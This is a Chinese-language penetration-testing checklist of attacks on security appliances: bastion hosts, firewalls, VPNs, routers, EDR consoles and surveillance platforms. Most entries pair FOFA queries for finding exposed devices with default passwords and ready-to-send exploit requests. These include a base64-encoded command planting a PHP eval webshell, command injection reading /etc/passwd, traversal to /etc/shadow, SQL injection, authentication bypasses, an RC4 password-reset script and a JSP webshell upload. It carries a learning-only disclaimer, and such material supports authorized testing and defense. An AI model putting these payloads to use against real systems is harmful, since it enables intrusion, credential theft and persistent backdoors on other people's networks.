# 安全设备漏洞 Checklist

更新时间：2023.06

##### **【免责声明】本项目所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，不得将其用于非授权渗透测试，否则后果自行承担，与本项目无关。使用本项目前请先阅读 [法律法规](https://github.com/Threekiii/Awesome-Laws)。**

&#x2705; 表示漏洞文档已收录 [Vulnerability-Wiki]( https://github.com/Threekiii/Vulnerability-Wiki) 漏洞库，仅收录2022/2023年部分安全设备，全部 iot 漏洞列表见 [README.md](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/README.md)。参考阅读：[ffffffff0x/SecDevice-Exploits](https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E5%AE%89%E9%98%B2%E8%AE%BE%E5%A4%87/SecDevice-Exploits.md#%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA)

## 一、身份与访问控制

### 0x01 堡垒机

#### 齐智堡垒机

FOFA：

```
app="齐治科技-堡垒机" 
```

##### 默认口令

```
shterm/shterm
```

##### shterm命令执行 tui.update.php

```
POST /shterm/listener/tui_update.php

a=["t';import os;os.popen('whoami')#"]
```

##### 前台命令执行 cluster_manage.php CNVD-2019-20835

访问以下路径，返回 ok：

```
http://10.20.10.11/listener/cluster_manage.php
```

写入webshell：

```
/var/www/shterm/resources/qrcode/lbj77.php  密码10086
```

```
https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}" ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}- d|bash`|${IFS}|echo${IFS}
```

##### 后台命令执行 data_provider.php CNVD-2019-17294

```
POST /audit/data_provider.php?ds_y=2019&ds_m=03&ds_d=02&ds_hour=01&ds_min=40&server_cond=&service=`id`&identity_cond=&query_type=all&format=json&browse=true
Host: your-ip

page=1&rp=30&sortname=stampl&sortorder=desc&query=&qtype=
```

##### 任意用户登录

```
/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
```

#### H3C SecPath

FOFA：

```
app="H3C-SecPath-运维审计系统" && body="2018"
```

#### Teleport 堡垒机

FOFA：

```
app="TELEPORT堡垒机"
```

##### 任意用户登录

返回 code 为 0 说明成功，刷新首页即可进入后台：

```
POST /auth/do-login

args={"type":2,"username":"admin","password":null,"captcha":"xxxx","oath":"","remember":false}
```

##### 后台文件读取

```
/audit/get-file?f=/etc/passwd&rid=1&type=rdp&act=read&amp;offset=0
```

### 0x02 IMC

#### H3C IMC 智能管理中心

FOFA：

```
"/imc/javax.faces.resource/images/login_logo_h3c.png.jsf?ln=primefaces-imc-new-webui"
```

```
body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui"
```

```
body="iMC来宾接入自助管理系统"
```

##### 远程代码执行

```
POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 1567

pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami
```

## 二、网络检测与响应

### 0x01 蜜罐

### 0x02 IDS

#### 绿盟 UTS 综合威胁探针

##### 管理员任意登录

输入 admin/任意密码，点击登录。更改响应包，将 {"status":false,...} 中的 false 改为 true，此时，响应包将泄露 admin 用户密码的 md5 值。

利用 md5 值登录页面：

```
POST /webapi/v1/authen_user

{"username":"admin","password":md5}
```

### 0x03 防火墙

#### 安恒 明御WEB应用防火墙 

FOFA：

```
app="安恒信息-明御WAF"
```

##### report.php 任意用户登录✅

漏洞指纹：

```
/report.m?a=rpc-timed
/system.m?a=reserved
```

#### Cisco ASA

```
app="CISCO-ASA-5520"
```

##### 拒绝服务/敏感信息获取 CVE-2018-0296

exp：

- https://github.com/yassineaboukir/CVE-2018-0296
- https://github.com/milo2012/CVE-2018-0296

##### 任意文件删除 CVE-2020-3187

exp：

- https://packetstormsecurity.com/files/158648/Cisco-Adaptive-Security-Appliance-Software-9.7-Arbitrary-File-Deletion.html

##### 目录穿越/任意文件读取 CVE-2020-3452

漏洞影响

```
Cisco ASA 设备影响版本：
<9.6.1
9.6 < 9.6.4.42
9.71
9.8 < 9.8.4.20
9.9 < 9.9.2.74
9.10 < 9.10.1.42
9.12 < 9.12.3.12
9.13 < 9.13.1.10
9.14 < 9.14.1.10
```

```
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

#### H3C SecPath下一代防火墙

FOFA：

```
title="Web user login"
```

##### 任意文件下载 ✅

```
/webui/?g=sys_dia_data_check&file_name=../../etc/passwd
```

```
/webui/?
g=sys_capture_file_download&name=../../../../../../../../etc/passwd
```

#### 奇安信 网康下一代防火墙

FOFA：

```
app="网康科技-下一代防火墙"
```

##### 远程命令执行 ✅

```
POST /directdata/direct/router HTTP/1.1

{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_test.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
```

访问：

```
https://x.x.x.x/test_test.txt
```

#### 启明星辰 天清汉马USG防火墙

##### 默认口令

```
useradmin/venus.user
```

#### 佑友防火墙

##### 默认口令

```
admin/hicomadmin
```

##### 后台命令执行

```
系统管理 --> 维护工具 --> Ping
127.0.0.1|cat /etc/passwd
```

#### ZeroShell

FOFA：

```
app="Zeroshell-防火墙"
```

##### ZeroShell 3.9.0 cgi-bin/kerbynet 命令执行

exp：

- https://www.exploit-db.com/exploits/49096

### 0x04 网关

#### 奇安信 网康 NS-ASG 安全网关

FOFA：

```
网康 NS-ASG 安全网关
```

##### 任意文件读取 ✅

```
/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
```

#### 安恒 明御安全网关 

##### 命令执行/任意文件读取✅

漏洞指纹：

```
/webui/?g=aaa_portal_auth_local_submit&suffix=
/webui/?g=sys_dia_data_down&file_name=
/webui/?g=sys_dia_data_check&file_name=
...
```

#### 锐捷 EG 易网关

##### 管理员账号密码泄露 ✅

获取账号密码：

```
POST /login.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

username=admin&password=admin?show+webmaster+user
```

##### branch_passw.php 远程命令执行 ✅

发送请求包：

```
POST /itbox_pi/branch_passw.php?a=set HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 41
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=52222egp72ilkpf2de7qbrigk3;user=admin;
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

pass=|cat /etc/psswd>../test_test.txt
```

再访问：

```
http://your-ip/test_test.txt
```

##### cli.php 远程命令执行 ✅

发送请求包：

```
POST /cli.php?a=shell HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; 
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

notdelay=true&command=id
```

##### download.php 任意文件读取 ✅

poc：

```
/download.php?a=read_txt&file=../../../../etc/passwd
```

#### 锐捷 ISG 视频接入安全网关

##### 账号密码泄露漏洞 ✅

FOFA：

```
title="RG-ISG"
```

F12 查看到账号密码，解密md5 后登陆系统。

### 0x05 路由器

#### D-Link DAP-2020

FOFA：

```
body="DAP-1360" && body="6.05"
```

##### webproc 任意文件读取 CVE-2021-27250 ✅

poc：

```
POST /cgi-bin/webproc

getpage=html%2Findex.html&errorpage=/etc/passwd&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=123&%3Aaction=login&%3Asessionid=3c1f7123
```

#### H3C 企业路由器（ER、ERG2、GR系列）

##### 任意用户登录漏洞 ✅

攻击者可通过访问 /userLogin.asp/../actionpolicy_status/../xxxx.cfg 接口，xxxx 为设备型号（比如设备型号为 ER5200G2，即访问 /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg），绕过 COOKIE 验证，进行目录穿越，获取设备的明文配置文件。

配置中有明文的 Web 管理员账号 admin 密码，登录后台可通过开启 telnet 获取命令执行权限。

#### iKuai 路由器

FOFA：

```
title="登录爱快流控路由"
```

##### 后台任意文件读取✅

默认密码：admin/admin

poc：

```
GET /Action/download?filename=../../../../../../etc/shadow HTTP/1.1
Host：
....
```

##### 流控路由 SQL注入漏洞✅

万能密码登录：

```
user: "or""=""or""="
pass: 空
```

#### 锐捷 NBR路由器

##### 远程命令执行漏洞 CNVD-2021-09650 ✅

FOFA：

```
title="锐捷网络-EWEB网管系统"
icon_hash="-692947551"
```

构造命令执行：

```
POST /guest_auth/guestIsUp.php
mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt
```

再访问：

```
/guest_auth/test.txt
```

### 0x06 负载均衡

#### Citrix ADC

##### 默认口令

```
nsroot/nsroot
```

##### 远程代码执行 CVE-2019-19781

访问以下链接，返回403则表示不存在漏洞，返回smb.conf则证明漏洞存在。

```
curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is
或
curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure
```

exp：

- https://github.com/trustedsec/cve-2019-19781
- https://github.com/jas502n/CVE-2019-19781

#### F5 BIG-IP

##### 远程代码执行 CVE-2020-5902

exp：

- https://github.com/jas502n/CVE-2020-5902
- https://github.com/theLSA/f5-bigip-rce-cve-2020-5902

##### 远程代码执行 CVE-2021-22986

```
POST /mgmt/tm/util/bash HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46QVNhc1M=
X-F5-Auth-Token: 
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 41

{"command":"run","utilCmdArgs":"-c id"}
```

exp：

- https://github.com/h4x0r-dz/RCE-Exploit-in-BIG-IP
- https://github.com/Al1ex/CVE-2021-22986

#### 天融信 Top-app LB

##### SQL注入

```
POST /acc/clsf/report/datasource.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22-- &o=r_Speed&gid=0&lmt=10&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=
```

#### 无密码登录

```
任意用户名  密码：;id
```

### 0x07 VPN

#### Fortigate SSL VPN

FOFA：

```
fofa: icon_hash="-404383634" app="FORTINET-防火墙"
```

##### 密码读取 CVE-2018-13379

exp：https://github.com/milo2012/CVE-2018-13379

##### 任意密码重置 CVE-2018-13382

exp：https://github.com/milo2012/CVE-2018-13382

##### 认证绕过 CVE-2022-40684

exp：https://github.com/horizon3ai/CVE-2022-40684

```
git clone https://github.com/horizon3ai/CVE-2022-40684.git
cd CVE-2022-40684
ssh-keygen -t rsa
python3 CVE-2022-40684.py -t 1.1.1.1 --username admin --key-file ~/.ssh/id_rsa.pub
ssh admin@1.1.1.1
```

#### Palo Alto SSL VPN

##### GlobalProtect 远程代码执行 CVE-2019-1579

exp：https://github.com/securifera/CVE-2019-1579

#### Pulse Secure SSL VPN

##### 任意文件读取 CVE-2019-11510

exp：https://github.com/projectzeroindia/CVE-2019-11510

##### 远程代码执行 CVE-2019-11539

exp：https://github.com/0xDezzy/CVE-2019-11539

#### 深信服 VPN

##### 常见密码

```
admin/sangfor@123
sangfor/sangfor
test/test
test1/123456b
```

##### 口令爆破

用户登录，若多次尝试登录失败会要求输入验证码，若输入错误的验证码，会提示“校验码错误或校验码已过期”；修改登录请求的数据包，清空cookie和验证码字段的值即可绕过验证码，此时提示“用户名或密码错误”。

```
/por/login_auth.csp?apiversion=1sangfor/cgi-bin/login.cgi?rnd=
```

##### 短信绕过

```
POST https://ip/por/changetelnum.csp?apiversion=1

newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1
```

##### 任意密码重置

加密算法使用了默认的key，攻击者构利用key构造重置密码数据包从而修改任意用户的密码。利用需要登陆账号。

- M7.6.6R1版本key为20181118
- M7.6.1key为20100720

```
POST /por/changepwd.csp

sessReq=clusterd&sessid=0&str=RC4_STR&len=RC4_STR_LEN(脚本计算后结果)
```

```python
from Crypto.Cipher import ARC4
from binascii import a2b_hex

def myRC4(data, key):
    rc41= ARC4.new(key)
    encrypted =rc41.encrypt(data)
    return encrypted. encode('hex')

def rc4_decrpt_hex(data, key):
    rc41= ARC4. new(key)
    return rc41. decrypt(a2b_hex(data))

key= '20100720'
data = r',username-TARGET_USERNAME, ip-127.0.0.1,grpid-1, pripsw-suiyi , newpsw=TARGET PASSWORD,'
print myRC4(data, key)
```

#### 锐捷 SSL VPN

FOFA：

```
icon_hash="884334722" || title="Ruijie SSL VPN"
```

##### 越权访问

- UserName 参数为已知用户名

```
GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1
Cookie: UserName=admin; SessionId=1; FirstVist=1; Skin=1; tunnel=1
```

#### Juniper SSL VPN 

- [Juniper SSLVPN / JunOS RCE and Multiple Vulnerabilities](https://octagon.net/blog/2022/10/28/juniper-sslvpn-junos-rce-and-multiple-vulnerabilities/)

## 三、终端响应与检测

### 0x01 EDR/杀软

#### 深信服 EDR

##### 命令执行1

exp：https://github.com/BH2UOL/sangfor-edr-exploit

##### 命令执行2

```
POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9

{"params":"w=123\"'1234123'\"|命令"}
```

##### 后台任意用户登录

```
xxx.xxx.xxx.xxx/ui/login.php?user=admin
```

#### 360天擎

FOFA：

```
title="360天擎"
```

##### 前台SQL注入

```
/api/dp/rptsvcsyncpoint?ccid=1
```

##### 数据库信息泄露

```
http://x.x.x.x/api/dbstat/gettablessize
```

#### 金山 V8 终端安全系统

FOFA：

```
title="在线安装-V8+终端安全系统Web控制台"
```

##### 任意文件读取

```
/htmltopdf/downfile.php?filename=downfile.php
```

##### pdf_maker.php 命令执行

```
POST /inter/pdf_maker.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx
```

#### 金山 VGM防毒墙 

FOFA：

```
"金山VGM"
```

##### downFile.php 任意文件读取

poc：

```
/downFile.php?filename=../../../../etc/passwd
```

### 0x02 数据防泄漏系统

#### 天融信数据防泄漏系统

##### 越权修改管理员密码

无需登录权限,由于修改密码处未校验原密码,且 /?module=auth_user&action=mod_edit_pwd 接口未授权访问,造成直接修改任意用户密码。 默认 superman 账户 uid 为 1。

```
POST /?module=auth_user&action=mod_edit_pwd

Cookie: username=superman;
uid=1&pd=Newpasswd&mod_pwd=1&dlp_perm=1
```

## 四、其他

### 0x01 网络摄像机

#### Hikvision DS/IDS/IPC 等设备

FOFA：

```
"671-1e0-587ec4a1"
```

##### 远程命令执行 CVE-2021-36260 ✅

```
python CVE-2021-36260.py --rhost 127.0.0.1 --rport 8081 --cmd "ls"
```

### 0x02 综合管理平台

#### 大华 智慧园区综合管理平台 

FOFA：

```
app="dahua-智慧园区综合管理平台"
```

##### user_save.action 任意文件上传 ✅

漏洞指纹：

```
POST /admin/user_save.action
```

```
POST /WPMS/getPublicKey
```

#### 大华 城市安防监控系统平台管理 

FOFA：

```
"attachment_downloadByUrlAtt.action"
```

##### attachment_downloadByUrlAtt.action 任意文件下载 ✅

poc：

```
/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```

#### Hikvision iVMS-8700综合安防管理平台

FOFA：

```
icon_hash="-911494769"
```

##### 任意文件下载 ✅

验证POC，token 为 URL md5：

```
/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 
```

##### 任意文件上传 ✅

发送请求包上传文件：

```
POST /eps/resourceOperations/upload.action HTTP/1.1
Host: 

------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
Content-Type: image/jpeg

<%out.print("hello");%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
```

访问webshell：

```
/eps/upload/769badc8ef5944da804a4ca3c8ecafb0.jsp
```

